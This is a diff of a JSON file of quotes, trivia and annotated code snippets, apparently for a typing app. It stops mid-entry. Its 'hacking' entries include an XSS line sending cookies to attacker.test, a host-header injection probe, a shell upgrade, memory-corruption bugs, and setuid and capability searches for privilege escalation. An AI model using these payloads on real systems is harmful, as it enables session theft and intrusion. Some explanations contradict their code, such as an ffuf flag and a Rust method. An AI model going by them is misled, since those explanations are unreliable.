@@ -1,345 +1,13 @@
 [
   {
-    "category": "anime",
-    "content": "Don't believe in yourself. Believe in me who believes in you.",
-    "attribution": "Gurren Lagann"
-  },
-  {
-    "category": "history",
-    "content": "We must always take sides. Neutrality helps the oppressor, never the victim. Silence encourages the tormentor.",
-    "attribution": "Elie Wiesel, 1986"
-  },
-  {
-    "category": "sysadmin",
-    "content": "awk -F: '$7 !~ /(nologin|false)$/ {print $1, $7}' /etc/passwd",
-    "attribution": "Users",
-    "language": "shell",
-    "explanation": "Accounts with a real login shell, which is the set that can actually sign in."
-  },
-  {
-    "category": "hacking",
-    "content": "pacman -Qkk 2>&1 | grep -v ' 0 altered files'",
-    "attribution": "Defence",
-    "language": "shell",
-    "explanation": "Compares installed files against the package manager's own checksums. A changed system binary shows up here."
-  },
-  {
-    "category": "general",
-    "content": "Honey never spoils if it is stored properly. Archaeologists have found pots of honey in ancient Egyptian tombs that are thousands of years old and still perfectly edible, preserved by its low moisture content and natural acidity."
-  },
-  {
-    "category": "anime",
-    "content": "When do you think people die? When they are forgotten.",
-    "attribution": "One Piece"
-  },
-  {
-    "category": "general",
-    "content": "The quick brown fox jumps over the lazy dog."
-  },
-  {
-    "category": "philosophy",
-    "content": "Stoicism is a school of ancient Greek philosophy that teaches the practice of virtue as the only true good, and encourages focusing only on what lies within one's own control."
-  },
-  {
-    "category": "hacking",
-    "content": "curl -s https://target/app.js | grep -oE '\"/[a-zA-Z0-9_/-]+\"' | sort -u",
-    "attribution": "Recon",
-    "language": "shell",
-    "explanation": "Pulls every unique path a site references from its own JavaScript. Endpoints that no link points at are still endpoints."
-  },
-  {
     "category": "science",
-    "content": "Science and everyday life cannot and should not be separated.",
-    "attribution": "Rosalind Franklin"
-  },
-  {
-    "category": "anime",
-    "content": "What I want more than anything is for you to live and help me live too.",
-    "attribution": "A Silent Voice"
-  },
-  {
-    "category": "nature",
-    "content": "No one will protect what they don't care about, and no one will care about what they have never experienced.",
-    "attribution": "David Attenborough"
-  },
-  {
-    "category": "hacking",
-    "content": "fetch('//attacker.test/?c=' + encodeURIComponent(document.cookie))",
-    "attribution": "Web",
-    "language": "javascript",
-    "explanation": "A stored XSS payload that steals a session. HttpOnly on the cookie is what stops this line reading it."
-  },
-  {
-    "category": "business",
-    "content": "A wealth of information creates a poverty of attention.",
-    "attribution": "Herbert Simon"
-  },
-  {
-    "category": "general",
-    "content": "The human brain generates enough electricity to power a small light bulb. Billions of neurons firing electrical signals at once produce roughly the same wattage as a dim household lamp."
-  },
-  {
-    "category": "anime",
-    "content": "We fear that which we cannot see.",
-    "attribution": "Bleach"
-  },
-  {
-    "category": "business",
-    "content": "Success breeds complacency. Complacency breeds failure. Only the paranoid survive.",
-    "attribution": "Andy Grove, Only the Paranoid Survive"
-  },
-  {
-    "category": "sysadmin",
-    "content": "ip route get 8.8.8.8",
-    "attribution": "Network",
-    "language": "shell",
-    "explanation": "Which route the kernel will actually use for a destination, including the source address it will pick."
-  },
-  {
-    "category": "quotes",
-    "content": "Whatever you are, be a good one.",
-    "attribution": "Abraham Lincoln"
-  },
-  {
-    "category": "nature",
-    "content": "The land is one great wild, untidy, luxuriant hothouse, made by nature for herself.",
-    "attribution": "Charles Darwin, The Voyage of the Beagle"
-  },
-  {
-    "category": "science",
-    "content": "The greatest enemy of knowledge is not ignorance, it is the illusion of knowledge.",
-    "attribution": "Stephen Hawking"
-  },
-  {
-    "category": "nature",
-    "content": "The earth is what we all have in common.",
-    "attribution": "Wendell Berry"
-  },
-  {
-    "category": "sysadmin",
-    "content": "chmod --reference=/etc/passwd /etc/passwd.new && chown --reference=/etc/passwd /etc/passwd.new",
-    "attribution": "Permissions",
-    "language": "shell",
-    "explanation": "Copies the ownership and mode of one file onto another, rather than typing the numbers and getting them wrong."
-  },
-  {
-    "category": "programming",
-    "content": "SELECT user_id, wpm, RANK() OVER (PARTITION BY mode ORDER BY wpm DESC) AS rank FROM results;",
-    "attribution": "SQL",
-    "language": "clike",
-    "explanation": "A window function ranks rows within each partition without collapsing them, which a GROUP BY cannot do."
-  },
-  {
-    "category": "literature",
-    "content": "It is a truth universally acknowledged, that a single man in possession of a good fortune, must be in want of a wife. However little known the feelings or views of such a man may be on his first entering a neighbourhood, this truth is so well fixed in the minds of the surrounding families.",
-    "attribution": "Jane Austen, Pride and Prejudice"
-  },
-  {
-    "category": "hacking",
-    "content": "ffuf -u https://target/FUZZ -w wordlist.txt -e .php,.bak,.old -mc 200,301,403",
-    "attribution": "Web",
-    "language": "shell",
-    "explanation": "Directory brute force. -x tries extensions, so index.php.bak and config.old surface alongside directories."
-  },
-  {
-    "category": "technology",
-    "content": "We can only see a short distance ahead, but we can see plenty there that needs to be done.",
-    "attribution": "Alan Turing, Computing Machinery and Intelligence"
-  },
-  {
-    "category": "business",
-    "content": "A bad system will beat a good person every time.",
-    "attribution": "W. Edwards Deming"
-  },
-  {
-    "category": "history",
-    "content": "To be ignorant of what occurred before you were born is to remain always a child.",
-    "attribution": "Cicero"
-  },
-  {
-    "category": "nature",
-    "content": "In every walk with nature one receives far more than he seeks.",
-    "attribution": "John Muir"
-  },
-  {
-    "category": "science",
-    "content": "Somewhere, something incredible is waiting to be known.",
-    "attribution": "Carl Sagan"
-  },
-  {
-    "category": "literature",
-    "content": "Call me Ishmael. Some years ago, never mind how long precisely, having little or no money in my purse, and nothing particular to interest me on shore, I thought I would sail about a little and see the watery part of the world.",
-    "attribution": "Herman Melville, Moby-Dick"
-  },
-  {
-    "category": "business",
-    "content": "The purpose of business is to create and keep a customer.",
-    "attribution": "Peter Drucker"
-  },
-  {
-    "category": "technology",
-    "content": "The most damaging phrase in the language is: we've always done it this way.",
-    "attribution": "Grace Hopper"
-  },
-  {
-    "category": "hacking",
-    "content": "forged = hashlib.sha256(secret_len * b'\\x00' + original + padding + suffix).hexdigest()",
-    "attribution": "Crypto",
-    "language": "python",
-    "explanation": "A length-extension attack works because the hash's internal state is its output. HMAC exists precisely to stop this."
-  },
-  {
-    "category": "history",
-    "content": "There are many causes that I am prepared to die for but no causes that I am prepared to kill for.",
-    "attribution": "Mahatma Gandhi"
-  },
-  {
-    "category": "business",
-    "content": "Management is doing things right; leadership is doing the right things.",
-    "attribution": "Peter Drucker"
-  },
-  {
-    "category": "technology",
-    "content": "Talk is cheap. Show me the code.",
-    "attribution": "Linus Torvalds"
-  },
-  {
-    "category": "history",
-    "content": "It was we, the people, not we, the white male citizens, nor yet we, the male citizens, who formed this Union.",
-    "attribution": "Susan B. Anthony, 1873"
-  },
-  {
-    "category": "philosophy",
-    "content": "The impediment to action advances action. What stands in the way becomes the way.",
-    "attribution": "Marcus Aurelius, Meditations"
-  },
-  {
-    "category": "history",
-    "content": "The only thing we have to fear is fear itself: nameless, unreasoning, unjustified terror.",
-    "attribution": "Franklin D. Roosevelt, 1933"
-  },
-  {
-    "category": "technology",
-    "content": "Adding manpower to a late software project makes it later.",
-    "attribution": "Fred Brooks, The Mythical Man-Month"
-  },
-  {
-    "category": "programming",
-    "content": "struct node { int value; struct node *next; };",
-    "attribution": "C",
-    "language": "clike",
-    "explanation": "A linked-list node. It refers to its own type through a pointer, which is legal because a pointer has a known size."
-  },
-  {
-    "category": "science",
-    "content": "If you know you are on the right track, if you have this inner knowledge, then nobody can turn you off.",
-    "attribution": "Barbara McClintock"
-  },
-  {
-    "category": "shell",
-    "content": "set -euo pipefail",
-    "attribution": "Shell safety",
-    "language": "shell",
-    "explanation": "The unofficial strict mode: exit on error, exit on undefined variable, and fail a pipeline if any stage fails rather than only the last."
-  },
-  {
-    "category": "anime",
-    "content": "You have no enemies. Nobody has any enemies. There is nobody that you should hurt.",
-    "attribution": "Vinland Saga"
-  },
-  {
-    "category": "hacking",
-    "content": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
-    "attribution": "Post-exploitation",
-    "language": "shell",
-    "explanation": "Upgrades a dumb shell to a real TTY, so job control, tab completion and su all start working."
-  },
-  {
-    "category": "business",
-    "content": "Your brand is what other people say about you when you're not in the room.",
-    "attribution": "Jeff Bezos"
-  },
-  {
-    "category": "anime",
-    "content": "This world is rotten, and those who are making it rot deserve to die.",
-    "attribution": "Death Note"
-  },
-  {
-    "category": "hacking",
-    "content": "curl -H 'X-Forwarded-Host: attacker.test' -s https://target/reset | grep -i location",
-    "attribution": "Web",
-    "language": "shell",
-    "explanation": "A header the application echoes back into a redirect or a password-reset link is a host header injection."
-  },
-  {
-    "category": "quotes",
-    "content": "Failure is impossible.",
-    "attribution": "Susan B. Anthony"
-  },
-  {
-    "category": "sysadmin",
-    "content": "docker system prune -af --volumes --filter 'until=168h'",
-    "attribution": "Containers",
-    "language": "shell",
-    "explanation": "Removes stopped containers, unused networks and dangling images. The usual cause of a full disk on a build host."
-  },
-  {
-    "category": "hacking",
-    "content": "char buf[64]; strcpy(buf, argv[1]); /* no bound - argv[1] decides the write length */",
-    "attribution": "Memory safety",
-    "language": "clike",
-    "explanation": "The classic overflow: strcpy writes until it finds a NUL, buf holds 64 bytes, and nothing checks which is larger."
+    "content": "Imagination is more important than knowledge. Knowledge is limited. Imagination encircles the world.",
+    "attribution": "Albert Einstein"
   },
   {
     "category": "movies",
-    "content": "Louis, I think this is the beginning of a beautiful friendship.",
-    "attribution": "Casablanca (1942)"
-  },
-  {
-    "category": "hacking",
-    "content": "if not hmac.compare_digest(expected_sig, provided_sig): raise ValueError('bad signature')",
-    "attribution": "Defence",
-    "language": "python",
-    "explanation": "Constant-time comparison. A plain == returns early on the first differing byte, which leaks the answer through timing."
-  },
-  {
-    "category": "programming",
-    "content": "let config: Config = toml::from_str(&fs::read_to_string(path)?)?;",
-    "attribution": "Rust",
-    "language": "rust",
-    "explanation": "The ? operator returns early on Err, converting the error type through From. It is what keeps error handling from nesting."
-  },
-  {
-    "category": "general",
-    "content": "Venus is the hottest planet in the solar system, even though Mercury sits closer to the sun. A thick blanket of carbon dioxide traps heat at the surface."
-  },
-  {
-    "category": "sysadmin",
-    "content": "find /etc /usr -type f -perm -o+w -ls 2>/dev/null",
-    "attribution": "Permissions",
-    "language": "shell",
-    "explanation": "World-writable files outside the places that are meant to be. A common way a service ends up modifiable by anyone."
-  },
-  {
-    "category": "programming",
-    "content": "git bisect start HEAD v1.2.0 && git bisect run ./test.sh",
-    "attribution": "Git",
-    "language": "shell",
-    "explanation": "Finds the commit that introduced a bug by bisecting history. Give it a known-good and known-bad commit and it halves the range each step."
-  },
-  {
-    "category": "programming",
-    "content": "if (typeof value !== 'string' || value.length === 0) { return null; }",
-    "attribution": "JavaScript",
-    "language": "javascript",
-    "explanation": "A guard clause: reject the bad input first and return, instead of nesting the real work inside an if."
-  },
-  {
-    "category": "programming",
-    "content": "impl Display for Token { fn fmt(&self, f: &mut Formatter) -> Result { write!(f, \"{}\", self.0) } }",
-    "attribution": "Rust",
-    "language": "rust",
-    "explanation": "Implementing Display is what makes a type usable in {}. self.0 is the first field of a tuple struct."
+    "content": "It's only after we've lost everything that we're free to do anything.",
+    "attribution": "Fight Club (1999)"
   },
   {
     "category": "sysadmin",
@@ -349,216 +17,57 @@
     "explanation": "Accounts with an empty password field. Should return nothing on any machine you care about."
   },
   {
-    "category": "shell",
-    "content": "awk '{bytes[$1] += $10} END {for (ip in bytes) print bytes[ip], ip}' access.log | sort -rn | head",
-    "attribution": "awk",
+    "category": "hacking",
+    "content": "find / -perm -4000 -type f 2>/dev/null",
+    "attribution": "Post-exploitation",
     "language": "shell",
-    "explanation": "Associative arrays are awk's real power. This sums bytes per IP in one pass, then END prints the totals once input is exhausted."
-  },
-  {
-    "category": "nature",
-    "content": "The earth does not belong to us. We belong to the earth.",
-    "attribution": "Chief Seattle"
-  },
-  {
-    "category": "quotes",
-    "content": "Genius is one percent inspiration and ninety-nine percent perspiration.",
-    "attribution": "Thomas Edison"
+    "explanation": "Finds setuid binaries. Anything unusual here runs as its owner no matter who executes it."
   },
   {
     "category": "technology",
-    "content": "We shape our tools, and thereafter our tools shape us.",
-    "attribution": "Marshall McLuhan"
-  },
-  {
-    "category": "quotes",
-    "content": "The only limit to our realization of tomorrow is our doubts of today.",
-    "attribution": "Franklin D. Roosevelt"
-  },
-  {
-    "category": "sysadmin",
-    "content": "systemctl cat sshd.service && systemctl show sshd -p ExecStart",
-    "attribution": "systemd",
-    "language": "shell",
-    "explanation": "Shows what a unit will actually run, including drop-ins, after every override has been merged."
-  },
-  {
-    "category": "technology",
-    "content": "The question of whether a computer can think is no more interesting than the question of whether a submarine can swim.",
-    "attribution": "Edsger Dijkstra"
-  },
-  {
-    "category": "programming",
-    "content": "grep -rn \"TODO\" src/ | awk -F: '{print $1}' | sort -u",
-    "attribution": "Shell",
-    "language": "shell",
-    "explanation": "grep -n prints file:line:text, awk splits on the colon to take the filename, sort -u removes the duplicates."
-  },
-  {
-    "category": "science",
-    "content": "Extraordinary claims require extraordinary evidence.",
-    "attribution": "Carl Sagan, The Demon-Haunted World"
-  },
-  {
-    "category": "history",
-    "content": "We choose to go to the moon in this decade and do the other things, not because they are easy, but because they are hard.",
-    "attribution": "John F. Kennedy, 1962"
-  },
-  {
-    "category": "literature",
-    "content": "The Nellie, a cruising yawl, swung to her anchor without a flutter of the sails, and was at rest. The flood had made, the wind was nearly calm, and being bound down the river, the only thing for it was to come to and wait for the turn of the tide.",
-    "attribution": "Joseph Conrad, Heart of Darkness"
-  },
-  {
-    "category": "literature",
-    "content": "You don't know about me without you have read a book by the name of The Adventures of Tom Sawyer, but that ain't no matter. That book was made by Mr. Mark Twain, and he told the truth, mainly.",
-    "attribution": "Mark Twain, Adventures of Huckleberry Finn"
+    "content": "A ship in port is safe, but that's not what ships are built for.",
+    "attribution": "Grace Hopper"
   },
   {
     "category": "business",
-    "content": "Organisations design systems which are copies of the communication structures of those organisations.",
-    "attribution": "Conway's Law"
+    "content": "When a measure becomes a target, it ceases to be a good measure.",
+    "attribution": "Goodhart's Law"
+  },
+  {
+    "category": "business",
+    "content": "Your brand is what other people say about you when you're not in the room.",
+    "attribution": "Jeff Bezos"
   },
   {
     "category": "anime",
-    "content": "Once you've met someone, you never really forget them.",
-    "attribution": "Spirited Away"
-  },
-  {
-    "category": "movies",
-    "content": "I love the smell of napalm in the morning.",
-    "attribution": "Apocalypse Now (1979)"
-  },
-  {
-    "category": "anime",
-    "content": "Anywhere can be paradise as long as you have the will to live.",
-    "attribution": "Neon Genesis Evangelion"
-  },
-  {
-    "category": "movies",
-    "content": "I am big. It's the pictures that got small.",
-    "attribution": "Sunset Boulevard (1950)"
-  },
-  {
-    "category": "technology",
-    "content": "Technology is neither good nor bad; nor is it neutral.",
-    "attribution": "Melvin Kranzberg"
+    "content": "You have no enemies. Nobody has any enemies. There is nobody that you should hurt.",
+    "attribution": "Vinland Saga"
   },
   {
     "category": "programming",
-    "content": "const total = items.reduce((acc, item) => acc + item.price, 0);",
-    "attribution": "JavaScript",
-    "language": "javascript",
-    "explanation": "reduce walks the array carrying a running value. The 0 is the starting total; drop it and an empty array throws."
+    "content": "*counts.entry(word).or_insert(0) += 1;",
+    "attribution": "Rust",
+    "language": "rust",
+    "explanation": "entry().or_insert_with() looks the key up once. The obvious contains_key-then-insert hashes it twice."
   },
   {
-    "category": "movies",
-    "content": "Get busy living, or get busy dying.",
-    "attribution": "The Shawshank Redemption (1994)"
-  },
-  {
-    "category": "general",
-    "content": "A day on Venus is longer than its year. The planet rotates so slowly on its axis that it takes longer to spin around once than it does to complete an entire orbit around the sun."
-  },
-  {
-    "category": "programming",
-    "content": "def fib(n): return n if n < 2 else fib(n - 1) + fib(n - 2)",
-    "attribution": "Python",
-    "language": "python",
-    "explanation": "Recursion with a base case. Correct but exponential - each call spawns two more, so it recomputes the same values repeatedly."
-  },
-  {
-    "category": "movies",
-    "content": "It's only after we've lost everything that we're free to do anything.",
-    "attribution": "Fight Club (1999)"
-  },
-  {
-    "category": "general",
-    "content": "The Pacific Ocean covers more of the planet than all the continents combined. It stretches from the icy waters near Antarctica to the Arctic Circle, and its deepest point, the Mariana Trench, plunges nearly eleven kilometers below the surface."
-  },
-  {
-    "category": "technology",
-    "content": "A distributed system is one in which the failure of a computer you didn't know existed can render your own computer unusable.",
-    "attribution": "Leslie Lamport"
-  },
-  {
-    "category": "general",
-    "content": "Bamboo is one of the fastest growing plants on Earth. Some species can grow nearly a meter in a single day under the right conditions, which is why it is used so widely in construction and manufacturing across Asia."
-  },
-  {
-    "category": "science",
-    "content": "The good thing about science is that it's true whether or not you believe in it.",
-    "attribution": "Neil deGrasse Tyson"
-  },
-  {
-    "category": "literature",
-    "content": "I read that every known superstition in the world is gathered into the horseshoe of the Carpathians, as if it were the centre of some sort of imaginative whirlpool, and it made me uneasy in a way I could not explain.",
-    "attribution": "Bram Stoker, Dracula"
-  },
-  {
-    "category": "programming",
-    "content": "document.querySelectorAll('.row').forEach(el => el.classList.toggle('active'));",
-    "attribution": "JavaScript",
-    "language": "javascript",
-    "explanation": "querySelectorAll returns a static NodeList, so it will not change as you mutate the elements in it."
-  },
-  {
-    "category": "hacking",
-    "content": "JSON.parse('{\"__proto__\": {\"isAdmin\": true}}')",
-    "attribution": "Web",
-    "language": "javascript",
-    "explanation": "Prototype pollution: writing through __proto__ reaches every object that inherits from it."
-  },
-  {
-    "category": "shell",
-    "content": "find . -name '*.log' -print0 | xargs -0 grep -l 'ERROR'",
-    "attribution": "Pipelines",
+    "category": "sysadmin",
+    "content": "journalctl -u nginx -n 50 --no-pager -p err",
+    "attribution": "systemd",
     "language": "shell",
-    "explanation": "xargs turns a stream of names into arguments. -0 with -print0 is what makes filenames containing spaces safe."
-  },
-  {
-    "category": "quotes",
-    "content": "Success is to be measured not so much by the position that one has reached in life as by the obstacles which he has overcome while trying to succeed.",
-    "attribution": "Booker T. Washington"
-  },
-  {
-    "category": "general",
-    "content": "The shortest war in recorded history was fought between Britain and Zanzibar in 1896. It lasted around forty minutes before Zanzibar surrendered."
-  },
-  {
-    "category": "general",
-    "content": "Sharks existed long before trees. Fossil evidence suggests that sharks have been swimming in the oceans for more than four hundred million years, while the earliest trees did not appear until tens of millions of years later."
+    "explanation": "Why a unit failed, without paging through the whole journal. -u scopes to the unit, -n limits the lines, --no-pager keeps it in the pipeline."
   },
   {
     "category": "programming",
-    "content": "with open('data.csv', encoding='utf-8') as f: rows = [line.split(',') for line in f]",
-    "attribution": "Python",
-    "language": "python",
-    "explanation": "with closes the file even if the body raises. Iterating a file yields lines without loading it all into memory."
+    "content": "fn main() { println!(\"{}\", args().skip(1).collect::<Vec<_>>().join(\" \")); }",
+    "attribution": "Rust",
+    "language": "rust",
+    "explanation": "skip(1) drops the program name, which is always the first argument. Vec<_> lets the compiler infer the element type."
   },
   {
     "category": "history",
-    "content": "The strong do what they can and the weak suffer what they must.",
-    "attribution": "Thucydides, History of the Peloponnesian War"
-  },
-  {
-    "category": "science",
-    "content": "If I have seen further it is by standing on the shoulders of giants.",
-    "attribution": "Isaac Newton"
-  },
-  {
-    "category": "anime",
-    "content": "I feel like I'm always searching for someone, or something.",
-    "attribution": "Your Name"
-  },
-  {
-    "category": "anime",
-    "content": "When people are protecting something truly special to them, they truly can become as strong as they can be.",
-    "attribution": "Naruto"
-  },
-  {
-    "category": "philosophy",
-    "content": "Utilitarianism holds that the right action is the one that produces the greatest good for the greatest number of people, judging morality by outcomes rather than intentions."
+    "content": "The world will little note nor long remember what we say here, but it can never forget what they did here.",
+    "attribution": "Abraham Lincoln, Gettysburg Address, 1863"
   },
   {
     "category": "shell",
@@ -569,266 +78,92 @@
   },
   {
     "category": "science",
-    "content": "The cosmos is within us. We are made of star-stuff. We are a way for the universe to know itself.",
-    "attribution": "Carl Sagan, Cosmos"
-  },
-  {
-    "category": "history",
-    "content": "Never in the field of human conflict was so much owed by so many to so few.",
-    "attribution": "Winston Churchill, 1940"
-  },
-  {
-    "category": "programming",
-    "content": "git reflog --date=iso | head -20",
-    "attribution": "Git",
-    "language": "shell",
-    "explanation": "Recovers commits that are no longer reachable from any branch. A hard reset does not destroy them; it just stops pointing at them."
-  },
-  {
-    "category": "anime",
-    "content": "A lesson without pain is meaningless. That's because you cannot gain something without sacrificing something else in return.",
-    "attribution": "Fullmetal Alchemist"
-  },
-  {
-    "category": "history",
-    "content": "I have cherished the ideal of a democratic and free society in which all persons live together in harmony and with equal opportunities.",
-    "attribution": "Nelson Mandela, 1964"
-  },
-  {
-    "category": "literature",
-    "content": "The Time Traveller, for so it will be convenient to speak of him, was expounding a recondite matter to us. His grey eyes shone and twinkled, and his usually pale face was flushed and animated.",
-    "attribution": "H.G. Wells, The Time Machine"
-  },
-  {
-    "category": "shell",
-    "content": "ls *.png | xargs -P4 -I{} convert {} -resize 50% small/{}",
-    "attribution": "Pipelines",
-    "language": "shell",
-    "explanation": "Runs a command per input line in parallel. -P4 keeps four running at once, and -I{} places each name where the braces are."
-  },
-  {
-    "category": "anime",
-    "content": "Life is suffering. It is hard. The world is cursed. But still, you find reasons to keep on living.",
-    "attribution": "Princess Mononoke"
-  },
-  {
-    "category": "philosophy",
-    "content": "It does not matter how slowly you go as long as you do not stop.",
-    "attribution": "Confucius, Analects"
-  },
-  {
-    "category": "nature",
-    "content": "In the woods, we return to reason and faith. There I feel that nothing can befall me in life which nature cannot repair.",
-    "attribution": "Ralph Waldo Emerson, Nature"
-  },
-  {
-    "category": "hacking",
-    "content": "libc.address = leak - libc.symbols['puts']",
-    "attribution": "Exploit dev",
-    "language": "python",
-    "explanation": "Leaks a libc address from the GOT, then rebases every other libc symbol off it. This is how ASLR is worked around rather than defeated."
-  },
-  {
-    "category": "literature",
-    "content": "Buck did not read the newspapers, or he would have known that trouble was brewing, not alone for himself, but for every tide-water dog, strong of muscle and with warm, long hair, from Puget Sound to San Diego.",
-    "attribution": "Jack London, The Call of the Wild"
-  },
-  {
-    "category": "history",
-    "content": "That's one small step for a man, one giant leap for mankind.",
-    "attribution": "Neil Armstrong, 1969"
-  },
-  {
-    "category": "shell",
-    "content": "mount | column -t | grep -v tmpfs",
-    "attribution": "Text processing",
-    "language": "shell",
-    "explanation": "column formats whitespace-separated input into aligned columns, which makes an unreadable log readable."
-  },
-  {
-    "category": "anime",
-    "content": "No matter how much I struggle, there's always a price to pay for changing the past.",
-    "attribution": "Steins;Gate"
-  },
-  {
-    "category": "programming",
-    "content": "public static void main(String[] args) { System.out.println(\"ready\"); }",
-    "attribution": "Java",
-    "language": "clike",
-    "explanation": "Java's entry point. The signature is fixed: static so it runs without an instance, and taking the command-line arguments."
+    "content": "What you do makes a difference, and you have to decide what kind of difference you want to make.",
+    "attribution": "Jane Goodall"
   },
   {
     "category": "business",
-    "content": "There is nothing so useless as doing efficiently that which should not be done at all.",
+    "content": "Management is doing things right; leadership is doing the right things.",
     "attribution": "Peter Drucker"
   },
   {
-    "category": "business",
-    "content": "Work expands so as to fill the time available for its completion.",
-    "attribution": "Parkinson's Law"
+    "category": "nature",
+    "content": "Wilderness is not a luxury but a necessity of the human spirit.",
+    "attribution": "Edward Abbey, Desert Solitaire"
   },
   {
-    "category": "literature",
-    "content": "My father's family name being Pirrip, and my Christian name Philip, my infant tongue could make of both names nothing longer or more explicit than Pip. So, I called myself Pip, and came to be called Pip.",
-    "attribution": "Charles Dickens, Great Expectations"
+    "category": "philosophy",
+    "content": "The impediment to action advances action. What stands in the way becomes the way.",
+    "attribution": "Marcus Aurelius, Meditations"
   },
   {
-    "category": "movies",
-    "content": "With great power comes great responsibility.",
-    "attribution": "Spider-Man (2002)"
+    "category": "general",
+    "content": "Octopuses have three hearts and blue blood. Two of the hearts pump blood to the gills, while the third circulates it to the rest of the body, and the blue color comes from a copper-based protein instead of iron."
   },
   {
-    "category": "shell",
-    "content": "sed -i 's/localhost/127.0.0.1/g' config.ini",
-    "attribution": "sed",
-    "language": "shell",
-    "explanation": "Substitute in place. The g flag replaces every match on a line, not just the first; -i writes the file rather than printing."
-  },
-  {
-    "category": "movies",
-    "content": "There's no crying in baseball.",
-    "attribution": "A League of Their Own (1992)"
-  },
-  {
-    "category": "hacking",
-    "content": "printf(user_input); /* format string bug - should be printf(\"%s\", user_input) */",
-    "attribution": "Memory safety",
-    "language": "clike",
-    "explanation": "An attacker-controlled format string. Every %x walks the stack; %n writes to it."
-  },
-  {
-    "category": "anime",
-    "content": "Don't be afraid of things you don't understand. Just accept them as they are.",
-    "attribution": "Mushishi"
-  },
-  {
-    "category": "programming",
-    "content": "try: value = int(raw) except ValueError: value = 0",
-    "attribution": "Python",
-    "language": "python",
-    "explanation": "Catching the specific exception, not a bare except - a bare one would also swallow KeyboardInterrupt."
+    "category": "general",
+    "content": "The shortest war in recorded history was fought between Britain and Zanzibar in 1896. It lasted around forty minutes before Zanzibar surrendered."
   },
   {
     "category": "history",
-    "content": "I am tired of fighting. From where the sun now stands, I will fight no more forever.",
-    "attribution": "Chief Joseph, Nez Perce, 1877"
+    "content": "It was we, the people, not we, the white male citizens, nor yet we, the male citizens, who formed this Union.",
+    "attribution": "Susan B. Anthony, 1873"
   },
   {
-    "category": "hacking",
-    "content": "lsmod | awk 'NR>1 {print $1}' | while read m; do modinfo -n \"$m\" 2>/dev/null; done | grep -v '^/lib/modules'",
-    "attribution": "Defence",
-    "language": "shell",
-    "explanation": "Compares running kernel modules against what the package manager installed. An unexpected module is worth explaining."
-  },
-  {
-    "category": "programming",
-    "content": "const unique = [...new Set(values)].sort((a, b) => a - b);",
-    "attribution": "JavaScript",
-    "language": "javascript",
-    "explanation": "A Set discards duplicates. Spreading it back to an array allows sorting; the comparator is required or numbers sort as text."
-  },
-  {
-    "category": "philosophy",
-    "content": "All men by nature desire to know.",
-    "attribution": "Aristotle, Metaphysics"
-  },
-  {
-    "category": "philosophy",
-    "content": "The only true wisdom is in knowing you know nothing.",
-    "attribution": "Socrates"
-  },
-  {
-    "category": "technology",
-    "content": "You can't trust code that you did not totally create yourself.",
-    "attribution": "Ken Thompson, Reflections on Trusting Trust"
-  },
-  {
-    "category": "sysadmin",
-    "content": "0 3 * * * /usr/local/bin/backup.sh >> /var/log/backup.log 2>&1",
-    "attribution": "Scheduling",
-    "language": "shell",
-    "explanation": "A cron entry that logs both streams. Without the redirect, cron mails the output to a mailbox nobody reads."
-  },
-  {
-    "category": "business",
-    "content": "The market can remain irrational longer than you can remain solvent.",
-    "attribution": "John Maynard Keynes"
-  },
-  {
-    "category": "anime",
-    "content": "If everyone is not special, maybe you can be what you want to be.",
-    "attribution": "Mob Psycho 100"
-  },
-  {
-    "category": "sysadmin",
-    "content": "ssh -o ControlMaster=auto -o ControlPersist=10m -o ControlPath=~/.ssh/cm-%r@%h:%p host",
-    "attribution": "SSH",
-    "language": "shell",
-    "explanation": "Reuses one connection for subsequent sessions, so every later ssh or scp to the same host skips the handshake."
-  },
-  {
-    "category": "technology",
-    "content": "Plan to throw one away; you will, anyhow.",
-    "attribution": "Fred Brooks, The Mythical Man-Month"
-  },
-  {
-    "category": "sysadmin",
-    "content": "df -i | awk '$5+0 > 80 {print}'",
-    "attribution": "Disk",
-    "language": "shell",
-    "explanation": "A disk that reports free space but still refuses writes is usually out of inodes, not bytes."
-  },
-  {
-    "category": "hacking",
-    "content": "journalctl -u sshd -f | grep -Ei 'failed|invalid user'",
-    "attribution": "Defence",
-    "language": "shell",
-    "explanation": "Watches authentication failures as they happen. Most intrusions are visible in logs long before they are noticed."
-  },
-  {
-    "category": "science",
-    "content": "An expert is a person who has made all the mistakes that can be made in a very narrow field.",
-    "attribution": "Niels Bohr"
-  },
-  {
-    "category": "literature",
-    "content": "The studio was filled with the rich odour of roses, and when the light summer wind stirred amidst the trees of the garden, there came through the open door the heavy scent of the lilac, or the more delicate perfume of the pink-flowering thorn.",
-    "attribution": "Oscar Wilde, The Picture of Dorian Gray"
-  },
-  {
-    "category": "quotes",
-    "content": "Stay hungry, stay foolish.",
-    "attribution": "Steve Jobs"
-  },
-  {
-    "category": "quotes",
-    "content": "I went to the woods because I wished to live deliberately, to front only the essential facts of life, and see if I could not learn what it had to teach, and not, when I came to die, discover that I had not lived.",
-    "attribution": "Henry David Thoreau, Walden"
-  },
-  {
-    "category": "movies",
-    "content": "What we've got here is failure to communicate.",
-    "attribution": "Cool Hand Luke (1967)"
+    "category": "history",
+    "content": "Injustice anywhere is a threat to justice everywhere.",
+    "attribution": "Martin Luther King Jr., Letter from Birmingham Jail, 1963"
   },
   {
     "category": "nature",
-    "content": "There lives the dearest freshness deep down things.",
-    "attribution": "Gerard Manley Hopkins, God's Grandeur"
+    "content": "The mountains are calling and I must go.",
+    "attribution": "John Muir"
   },
   {
-    "category": "technology",
-    "content": "The best way to predict the future is to invent it.",
-    "attribution": "Alan Kay"
+    "category": "programming",
+    "content": "export async function load(url) { const res = await fetch(url); return res.json(); }",
+    "attribution": "JavaScript",
+    "language": "javascript",
+    "explanation": "fetch resolves as soon as headers arrive, so .json() is a second await for the body. It does not throw on a 404 - check res.ok."
   },
   {
-    "category": "quotes",
-    "content": "The two most important days in your life are the day you are born and the day you find out why.",
-    "attribution": "Mark Twain"
+    "category": "hacking",
+    "content": "getcap -r / 2>/dev/null | grep -E 'cap_(setuid|dac_override|sys_admin)'",
+    "attribution": "Post-exploitation",
+    "language": "shell",
+    "explanation": "Capabilities are finer-grained than setuid but grant real power. cap_setuid on an interpreter is root."
   },
   {
     "category": "nature",
     "content": "I went to the woods because I wished to live deliberately, to front only the essential facts of life.",
     "attribution": "Henry David Thoreau, Walden"
+  },
+  {
+    "category": "shell",
+    "content": "awk -F, 'NF != 3 {print NR\": \"$0}' data.csv",
+    "attribution": "awk",
+    "language": "shell",
+    "explanation": "NR is the current line number, NF the field count. This finds malformed rows: any line that does not have exactly three fields."
+  },
+  {
+    "category": "history",
